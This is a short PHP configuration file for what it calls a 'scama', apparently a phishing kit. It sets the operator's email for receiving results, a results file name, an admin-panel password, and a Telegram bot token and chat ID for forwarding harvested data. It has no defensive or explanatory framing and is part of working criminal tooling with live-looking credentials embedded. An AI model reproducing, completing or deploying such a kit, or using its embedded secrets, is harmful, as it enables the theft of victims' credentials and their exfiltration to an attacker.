<?php
// setting scama
$yourmail  = "lord.qiezt@yandex.com";  // your email 
$namerand = "Results";  // name for file rzult *
$pass = "Memek123"; // pass admin panel
$botToken="7936034576:AAFNPElaVV1oPnmWa-Wofla7ZzCAsAzX0RI"; // token bot telegram
$chatId="6251439446";  // chatId telegram

?>